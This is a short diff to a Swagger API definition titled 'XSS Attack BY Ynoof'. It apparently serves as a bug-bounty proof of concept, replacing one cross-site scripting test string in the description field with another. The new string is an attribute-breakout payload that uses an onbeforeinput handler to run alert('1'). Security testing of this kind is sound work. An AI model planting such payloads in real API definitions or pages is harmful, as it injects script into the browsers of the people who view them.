@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY Ynoof
   description: |
-    <svg onload=x>aaaaaa
+    "><a href="asasas"+contenteditable+onbeforeinput%3D"alert('1')%3B">intigriti</a>
   version: production
 basePath: /JSSResource/
 produces:
